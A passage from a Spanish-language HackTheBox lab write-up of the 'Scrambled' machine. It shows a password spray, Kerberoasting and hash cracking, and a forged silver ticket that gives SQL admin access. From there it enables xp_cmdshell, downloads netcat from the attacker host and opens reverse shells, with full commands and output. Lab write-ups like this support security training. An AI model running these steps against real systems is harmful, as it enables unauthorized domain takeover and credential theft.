LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>+] scrm.local<span class="se">\k</span>simpson
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\k</span>hicks:khicks KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\s</span>jenkins:sjenkins KDC_ERR_PREAUTH_FAILED
</code></pre></div></div>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">ksimson</code> usa como contraseña su nombre de usuario también podemos validarlo con <code class="language-plaintext highlighter-rouge">kerbrute</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 bruteuser <span class="nt">--dc</span> 10.10.11.168 <span class="nt">-d</span> scrm.local users.txt ksimpson

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 19:04:36 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/29 19:04:36 <span class="o">&gt;</span>  	10.10.11.168:88

2024/04/29 19:04:36 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID LOGIN:	 ksimpson@scrm.local:ksimpson
2024/04/29 19:04:36 <span class="o">&gt;</span>  Done! Tested 5 logins <span class="o">(</span>1 successes<span class="o">)</span> <span class="k">in </span>0.400 seconds
</code></pre></div></div>

<h2 id="shell-as-sqlsvc">Shell as SQLSvc</h2>

<ul>
  <li>Como tenemos credenciales podemos probar un <code class="language-plaintext highlighter-rouge">Kerberoasting Attack</code> pero con el parámetro <code class="language-plaintext highlighter-rouge">-k</code> ya que tenemos la atención <code class="language-plaintext highlighter-rouge">NTLM</code> deshabilitada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting machine <span class="nb">hostname</span>
<span class="o">[</span>-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the <span class="nt">-dc-host</span> option
</code></pre></div></div>

<ul>
  <li>Aun así obtenemos un error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting machine <span class="nb">hostname</span>
<span class="o">[</span>-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the <span class="nt">-dc-host</span> option
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos en internet errores al operar con <code class="language-plaintext highlighter-rouge">-k</code> encontramos lo siguiente <a href="https://github.com/fortra/impacket/issues/1206">https://github.com/fortra/impacket/issues/1206</a>.</p>
  </li>
  <li>
    <p>Pero tenemos que cambiar una parte del código en esta parte.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/6.png" />
</p>

<ul>
  <li>Tenemos que cambiarla por esta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/7.png" />
</p>

<ul>
  <li>Ahora ya funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span>-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
<span class="nt">----------------------------</span>  <span class="nt">------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
</code></pre></div></div>

<ul>
  <li>Ahora vamos a obtener el hash del usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-request</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span>-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
<span class="nt">----------------------------</span>  <span class="nt">------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc<span class="k">*</span><span class="nv">$0404e156f2b44fdc2ccabae35e43d08d$eb31843c7e1cb948d143812b4a93c13e6241e8865b6a807e64c59acd7fdd841f438222bcfb364667dc59bfccc085c29405ca00b652b0b9a90d6c5647a9a3b2d9fdd119d4c85a2fcf490a0340b1649bdb55302cfecdf2bfbd18c6eee115c9e81c27869b976fc589b027e3128dece13b86bc4b8b7b659c733caa0f5a212e4917ff3b6584d52b8597599e9096da96cb2e4904bc848ff4972fee71188c948875c93c6d9aa493c8b02a115db904970717d2704368c1e6a364e6f1c7ba5d5524e9d7d8a11217c707c7a0c040d2b7aca2cc11113aafdcc22d0c3a01ec6f00d3424a959cdaf1adcb2295cf30aeac9cd3e8e96bb85497262171d4718ab7cf20f7b57d64de5e9f645871fbef03f763cb2256c8765d6eae6db3d8cee1109dfb530a782e472bd6b84b7622e91956544f521f76c66399d58b1e892a945316b7f88007c58f49e91f1dd7a7e96a1ed0d1652d16d896150f1e1799f5b733fcec1c3d3c7619892cf6ba0da6cb5239af4be492e3d082fa899eb4abe657a24bf908ff366e8a3c06a2b2462f35f793e690d92091ef264b7a7f440bd2660f42fabf1cef538d7e276825fabdf740859a3621efb81f25ca525ae8763e20d9907b1c37b37cc44bb186a5c39adc5f7d6bbb1f0255bfc9f716f34e2e6079549be7ff3a104ce3c2ecaddabaf0122b7394660c98ec32579f696a1ae20223ae2fd5a5ccebc258413fd6785374bbd6b4b2f40872aaa1e03cd621fdd7bc0860ac1498c26c8c7e82f6c16faeb70908c23bbc1b5ae03c62b55445e781c960ccc5b412320cd8cd0bc3d779a346a9c3940b5f1c3bc7ab8c31efc1d73ac4575c06a0337a03da926bc3a4d86accabd34c95a64569e0b6d089f15db63901de7dd308b9d1e76f7989b48f9f97c600dcaf6dfc3d0372c64b354bb5869f20e034ae1e5ab1a77e9e536351496290eac31e127fe015045c9e1e9a7d82d021b42eaa1773bf3bf87e9b0e52f4758013f7ef4c6cea2998f93c903f2120e09698910fa170dbcfac23920a7551a77285642046fabadb0bf1e822c169846e6d583053c8f9cee5e3775a784e6bd3e55323befa1bf9859a1036e659bb932f75296d14f33e047ced0731d7daf25c20f94c94604e709b5b9307c36f38e81211f7248eb6a05f19dbb78c754e7aa128984aa3eaba2a2c16d2c3fae396c8459c152150e467d06782669c70ada40d5b67361a198d1c945be215402b81b6f43dbfa9b3a12d20b804f9b51bb61568e14793687d8b33d51ed9da783403ebe4b20930b05ee92e44f1046158a01f2c871cf8a118a89b01d168e1fcd936f19101c115d69b1d5ca6ed2cc9acc95c23690287f4e9852b7f5d6af97c92cd5ee2ff82b4e8f32724809394976a75ea91c15c48da114419cca7499b3aeda0a71ff6067e78893d8e8f37941226928c00fa1684cf41fb7bbd30af815213f5</span>
</code></pre></div></div>

<ul>
  <li>Vamos a crackearlo con <code class="language-plaintext highlighter-rouge">john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Pegasus60        <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:13 DONE <span class="o">(</span>2024-04-29 19:56<span class="o">)</span> 0.07547g/s 809771p/s 809771c/s 809771C/s Peguero..Pearce
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> para conectarnos.</p>
  </li>
  <li>
    <p>Pero obtenemos un error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'sqlsvc'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Tenemos que usar <code class="language-plaintext highlighter-rouge">kerberos</code> pero necesitamos un <code class="language-plaintext highlighter-rouge">TGT</code> para poder autenticarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT scrm.local/sqlsvc:Pegasus60
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>sqlsvc.ccache
</code></pre></div></div>

<ul>
  <li>Ahora vamos a exportar la variable de entorno.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>sqlsvc.ccache
</code></pre></div></div>

<ul>
  <li>Pero aun así no podemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'SCRM\sqlsvc'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a probar con el otro usuario.</p>
  </li>
  <li>
    <p>Pero nada.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>ksimpson.ccache
➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ksimpson.ccache
➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'SCRM\ksimpson'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos el <code class="language-plaintext highlighter-rouge">SPN</code> podemos hacer un <code class="language-plaintext highlighter-rouge">Silver Ticket Attack</code> para suplantar un usuario.</p>
  </li>
  <li>
    <p>Pero antes podemos probar enumerar por <code class="language-plaintext highlighter-rouge">smb</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
HR
IPC<span class="err">$</span>
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c"># use Public</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 <span class="nb">.</span>
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 ..
<span class="nt">-rw-rw-rw-</span>     630106  Fri Nov  5 11:45:07 2021 Network Security Changes.pdf
<span class="c"># get Network Security Changes.pdf</span>
</code></pre></div></div>

<ul>
  <li>Al abrirlo ya vimos por que no podemos conectarnos al parecer solo los administradores pueden.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/8.png" />
</p>

<ul>
  <li>Bueno vamos a suplantar la identidad del usuario administrador para hacer esto necesitamos el <code class="language-plaintext highlighter-rouge">Domain SID</code> del dominio para generar un <code class="language-plaintext highlighter-rouge">TGS</code> bajo el usuario administrador <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getPac scrm.local/ksimpson:ksimpson <span class="nt">-targetUser</span> Administrator | <span class="nb">grep </span>Domain
LogonDomainName:                 <span class="s1">'SCRM'</span>
LogonDomainId:
ResourceGroupDomainSid:
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
</code></pre></div></div>

<ul>
  <li>Ahora necesitamos el hash <code class="language-plaintext highlighter-rouge">NT</code> para eso como tenemos la contraseña tenemos que convertirlo <a href="https://codebeautify.org/ntlm-hash-generator">https://codebeautify.org/ntlm-hash-generator</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b999a16500b87d17ec7f2e2a68778f05
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">ticketer</code> con el <code class="language-plaintext highlighter-rouge">SPN</code> que tenemos, el <code class="language-plaintext highlighter-rouge">hash</code> y el <code class="language-plaintext highlighter-rouge">Domain SID.</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-ticketer <span class="nt">-spn</span> MSSQLSvc/dc1.scrm.local <span class="nt">-nthash</span> b999a16500b87d17ec7f2e2a68778f05 <span class="nt">-domain-sid</span> S-1-5-21-2743207045-1827831105-2542523200 <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-domain</span> scrm.local Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating basic skeleton ticket and PAC Infos
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Customizing ticket <span class="k">for </span>scrm.local/Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_LOGON_INFO
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_CLIENT_INFO_TYPE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Signing/Encrypting final ticket
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_SERVER_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_PRIVSVR_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora exportamos la variable.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Y bueno somos <code class="language-plaintext highlighter-rouge">administrator</code> a si que vamos habilitador <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos y asi poder ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
</span>output
<span class="nt">-----------</span>
scrm<span class="se">\s</span>qlsvc

NULL

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a subir el nc.exe a la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"curl 10.10.14.2/nc.exe -o C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span>
output                                                                  
<span class="nt">--------------------------------------------------------------------------------</span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--100 28160  100 28160    0     0  85836      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 86116

NULL                                                                    
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe -e cmd 10.10.14.2 443"</span>
</code></pre></div></div>

<ul>
  <li>La recibimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 55826
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>scrm<span class="se">\s</span>qlsvc

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="shell-as-miscsvc">Shell as miscsvc</h2>

<ul>
  <li>Vemos otro usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:<span class="se">\U</span>sers

05/11/2021  15:56    &lt;DIR&gt;          <span class="nb">.</span>
05/11/2021  15:56    &lt;DIR&gt;          ..
05/11/2021  22:28    &lt;DIR&gt;          administrator
03/11/2021  20:31    &lt;DIR&gt;          miscsvc
26/01/2020  18:54    &lt;DIR&gt;          Public
01/06/2022  14:58    &lt;DIR&gt;          sqlsvc
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               6 Dir<span class="o">(</span>s<span class="o">)</span>  16,013,860,864 bytes free
</code></pre></div></div>

<ul>
  <li>Vemos una vía no intencionada <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers&gt;whoami /priv
<span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacerlo por la vía intencionada si no ya seria explotar eso y listo.</p>
  </li>
  <li>
    <p>Vamos a enumerar el servicio <code class="language-plaintext highlighter-rouge">sql</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> SELECT name FROM master.sys.databases<span class="p">;</span>
name
<span class="nt">----------</span>
master

tempdb

model

msdb

ScrambleHR

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver las tablas de <code class="language-plaintext highlighter-rouge">ScrambleHR</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> <span class="k">select </span>table_name from ScrambleHR.information_schema.tables<span class="p">;</span>
table_name
<span class="nt">----------</span>
Employees

UserImport

Timesheets

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> <span class="k">select</span> <span class="k">*</span> from ScrambleHR.dbo.UserImport
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups
<span class="nt">--------</span>   <span class="nt">-----------------</span>   <span class="nt">----------</span>   <span class="nt">---------------</span>   <span class="nt">-------------</span>
MiscSvc    ScrambledEggs9900   scrm.local                90               0
</code></pre></div></div>

<ul>
  <li>Podemos usar Powershell para definir la credencial.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'scrm.local\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
<span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'scrm.local\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
scrm<span class="se">\m</span>iscsvc
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> C:<span class="se">\T</span>emp<span class="se">\n</span>etcat.exe <span class="nt">-e</span> cmd 10.10.14.3 443 <span class="o">}</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61231
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>scrm<span class="se">\m</span>iscsvc

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;type C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
99e0ac7dcbc5c354ac0169f07630794d

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Vemos estos archivos interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 5805-B4B6

